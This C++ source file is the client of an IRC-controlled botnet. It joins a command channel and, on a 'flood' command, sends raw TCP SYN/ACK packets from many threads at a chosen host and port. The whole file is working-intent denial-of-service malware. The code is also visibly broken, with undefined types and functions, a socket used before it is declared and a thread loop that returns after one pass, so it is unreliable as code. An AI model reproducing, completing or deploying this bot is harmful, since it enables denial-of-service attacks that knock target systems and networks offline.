#include <iostream>
#include <stdlib.h>
#include <pthread.h>
#include <signal.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>
#include <netinet/tcp.h>

#define SERV_ADDR "192.168.47.1"
#define SERV_PORT 6667
#define CHAN "#bots"
#define CHANLEN 5
#define MAX_WORDS 4
#define DELAY 1000

class plug {
public:
    bool MPTCP_EN;
    int fd;
    int link(const char* host, int port); /* Connect */
    int unlink(); /* Disconnect */
    int in(char* buf); /* Read line (plus added nul char) */
    int out(const char* buf); /* Write line */
    plug& operator <<(const char* buf);
    plug();
private:
    int bi;
    char buffer[512];
};

plug::plug() {
    bi = 0;
    MPTCP_EN = 0;
}

int plug::link(const char* host, int port) {
    struct sockaddr_in si;
    struct hostent *hostess_twinkies = gethostbyname(host);
    fd = socket(PF_INET, SOCK_STREAM, 0);
    si.sin_family = AF_INET;
    si.sin_port = htons(port);
    si.sin_addr = *((struct in_addr*)hostess_twinkies->h_addr);
    memset(&(si.sin_zero), 0, 8);
    if (connect(fd,(struct sockaddr*)&si,sizeof(struct sockaddr))==-1) fd=0;
    return fd;
}

int plug::unlink() { return close(fd); }

int plug::in(char* buf) {
    int len;
    for (len=0;recv(fd,buf,1,0);len++,buf++)
        if (*buf=='\n')
            if (*(buf-1)=='\r') {
                *(buf+1)=0;
                return len;
            }
}
int plug::out(const char* buf) {
    int i;
    for (i=0;*(short*)buf!=0x0a0d;i++,buf++);
    buf-=i; i+=2;
    return send(fd,buf,i,0);
}

plug& plug::operator <<(const char* buf) {
    int len = strlen(buf);
    memmove(buffer+bi,buf,len);
    bi+=len;
    if (buf[len-1]=='\n' && buf[len-2]=='\r') {
        send(fd,buffer,bi,0);
        bi = 0;
    }
    return *this;
}

static int flooding = 0;
static int toggle = 0;
static bool MPTCP_STATUS = 0;
static int MAX_THREADS = 64;
static int THREAD_NUM = MAX_THREADS;

static plug s;

struct flood_args{
    char *addr;
    int port;
};

//void quit(int sig);

using namespace std;

void *flood(void *args){

    bool bFlag = 1;
	char szBuffer[60] = {0};
	iphdr iphdr;
	pshdr psdhdr;
	tcphdr tcphdr;

	struct sockaddr_in si;
    struct hostent *hostess_twinkies = gethostbyname(*((struct flood_args*)args)->addr);

    setsockopt(sock, SOL_TCP, 42, &MPTCP_STATUS, sizeof(MPTCP_STATUS));
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char*)&bFlag, sizeof(bFlag));

    si.sin_family = AF_INET;
    si.sin_port = htons(*((struct flood_args*)args)->port);
    si.sin_addr = *((struct in_addr*)hostess_twinkies->h_addr);
    memset(&(si.sin_zero), 0, 8);

    int sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);

	while (1)
	{
			iphdr.h_verlen = (4 << 4 | sizeof(iphdr) / sizeof(unsigned long));
			iphdr.total_len = htons(sizeof(iphdr) + sizeof(tcphdr));
			iphdr.ident = 1;
			iphdr.frag_and_flags = 0;
			iphdr.ttl = 128;
			iphdr.proto = IPPROTO_TCP;
			iphdr.checksum = 0;
			iphdr.sourceIP = inet_addr(ip_getip(sock));//
			iphdr.destIP = sin.sin_addr;//
			tcphdr.th_dport = htons(*((struct flood_args*)args)->port);
			tcphdr.th_sport = htons(rand() % 1025);
			tcphdr.th_seq = htonl(0x12345678);
			tcphdr.th_ack = rand() % 3;
            if (rand() % 2 == 0)tcphdr.th_flags = SYN;
            else tcphdr.th_flags = ACK;
			tcphdr.th_lenres = (sizeof(tcphdr) / 4 << 4 | 0);
			tcphdr.th_win = htons(512);
			tcphdr.th_urp = 0;
			tcphdr.th_sum = 0;
			psdhdr.saddr = iphdr.sourceIP;
			psdhdr.daddr = iphdr.destIP;
			psdhdr.mbz = 0;
			psdhdr.ptcl = IPPROTO_TCP;
			psdhdr.tcpl = htons(sizeof(tcphdr));
			memcpy(szBuffer, &psdhdr, sizeof(psdhdr));
			memcpy(szBuffer + sizeof(psdhdr), &tcphdr, sizeof(tcphdr));
			tcphdr.th_sum = tcpchecksum((char *)szBuffer, sizeof(psdhdr) + sizeof(tcphdr));
			memcpy(szBuffer, &iphdr, sizeof(iphdr));
			memcpy(szBuffer + sizeof(iphdr), &tcphdr, sizeof(tcphdr));
			memset(szBuffer + sizeof(iphdr) + sizeof(tcphdr), 0, 4);
			iphdr.checksum = tcpchecksum((char *)szBuffer, sizeof(iphdr) + sizeof(tcphdr));
			memcpy(szBuffer, &iphdr, sizeof(iphdr));
			sendto(sock,(char*)&szBuffer, sizeof(szBuffer), 0, (const struct sockaddr*)&sin, sizeof(sin));
			Sleep(DELAY);
	}
    close(sock);
}

int initThreads(pthread_attr_t *attr){
    if(pthread_attr_init(attr) || pthread_attr_setdetachstate(attr, PTHREAD_CREATE_DETACHED)){
            cout << "Could not init pthread_attr" << endl;
            return -1;
    }
    return 1;
}
int attachThreads(pthread_t *threads, pthread_attr_t *attr, flood_args *args, int num){
    for(int j = 0; j < num; j++){
        if(!pthread_create(threads + j, (const pthread_attr_t*)attr, flood, (void*)args)){
                pthread_detach(*(threads + j));
        }
        else{
            cout << "Could not create threads" << endl;
            return -1;
        }
        pthread_attr_destroy(attr);
        return 1;
    }
}
int killThreads(pthread_t *threads, pthread_attr_t *attr, int num){
    pthread_attr_destroy(attr);
    for(int j = 0; j < num; j++){
        pthread_exit(NULL);
        pthread_kill(*(threads + j), SIGTERM);
    }
}

char* generateNick(){
	char str[6] = "bot  ";
    char *nick = str;
    srand(time(NULL));
    *(nick + 3) = 48 + rand()%9;
    *(nick + 4) = 48 + rand()%9;
    return nick;
}

int ircParseCommand(char *line, pthread_t *threads, pthread_attr_t *attr, flood_args *args){

    char *tok = strtok(line, " ");

    cout << "Command to parse: " << line << endl;

    if(*tok == 'k'){//kill_bots
        if(flooding)killThreads(threads, attr, MAX_THREADS);
        flooding = 0;
        s << "QUIT :disconnecting\r\n";
        return 1;
    }

    if(*tok == 'f' && !flooding){//flood
            char *tok2 = NULL;
            char *tok3 = NULL;
            tok2 = strtok(NULL, " ");
            tok3 = strtok(NULL, " ");
            if(tok2 != NULL && tok3 != NULL){
                if(gethostbyname(tok2) != NULL){
                    int tmp;
                    try{
                        tmp = atoi(tok3);
                    }
                    catch(...){
                        cout << "flood: invalid arguments" << endl;
                        return 0;
                    }
                    cout << "Started flooding " << tok2 << ":" << tmp << endl;
                    cout << "MPTCP_STATUS set to " << MPTCP_STATUS << endl;
                    args->addr = tok2;
                    args->port = tmp;
                    initThreads(attr);
                    attachThreads(threads, attr, args, THREAD_NUM);
                    flooding = 1;
                    return 0;
                }
                cout << "flood: invalid arguments" << endl;
                return 0;
            }
            cout << "flood: invalid arguments" << endl;
            return 0;
    }

    if(*tok == 's'){//stop_flood
            if(flooding){
                killThreads(threads, attr, MAX_THREADS);
                cout << "Stopped flooding" << endl;
                flooding = 0;
            }
            return 0;
    }

    if(*tok == 't'){//toggle_mptcp
            MPTCP_STATUS = !MPTCP_STATUS;
            cout << "MPTCP_STATUS set to " << MPTCP_STATUS << endl;
            return 0;
    }

    if(*tok == 'n'){//number_threads
            char *tok2 = NULL;
            tok2 = strtok(NULL, " ");
            if(tok2 != NULL){
                int tmp;
                try{
                    tmp = atoi(tok2);
                }
                catch(...){
                    cout << "set_threadnum: invalid arguments" << endl;
                    return 0;
                }
                THREAD_NUM = tmp;
                cout << "THREAD_NUM set to " << THREAD_NUM << endl;
                return 0;
            }
            cout << "set_threadnum: invalid arguments" << endl;
            return 0;
    }

    cout << "Unknown command" << endl;
    return 0;
}

int main(){

    pthread_t threads[THREAD_NUM];
    pthread_attr_t attr;

    struct flood_args args;

    struct sigaction sa;
    //sa.sa_handler = &quit;
    sa.sa_flags = 0;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGINT,&sa,0);

    char buf[513];

    s.link(SERV_ADDR, SERV_PORT);

    char *nick = generateNick();
    s << "USER " << nick << " 0 * :" << nick << "\r\n";
    s << "NICK " << nick << "\r\n";

    while (s.in(buf)) {
            if (strstr(buf, "PING ") == buf) {
                s << "PO" << buf + 2;
            } else if (*buf == ':' && !memcmp(strchr(buf, ' ') + 1, "001", 3)) {
                s << "MODE " << nick << " +B\r\n";
                s << "JOIN " << CHAN << "\r\n";

            } else if (*buf == ':' && !memcmp(strchr(buf, ' ') + 1, "433", 3)) {
                s << "MODE " << generateNick() << " +B\r\n";
                s << "JOIN " << CHAN << "\r\n";

            }else if (*buf == ':' && !memcmp(strchr(buf, ' ') + 1, "PRIVMSG", 7)) {
                if (!memcmp(strchr(buf, '#'), CHAN, CHANLEN)){
                    char *str = strchr(buf, '-');
                    if(str != NULL)toggle = ircParseCommand(++str, threads, &attr, &args);
                }
            }
            cout << buf;
           if(toggle){
                s.unlink();
                return 0;
           }
    }
    s.unlink();
    return 0;
}

/*void quit(int sig) {
    s << "CTRL-C pressed. Quit.";
    s.unlink();
    exit(0);
}*/
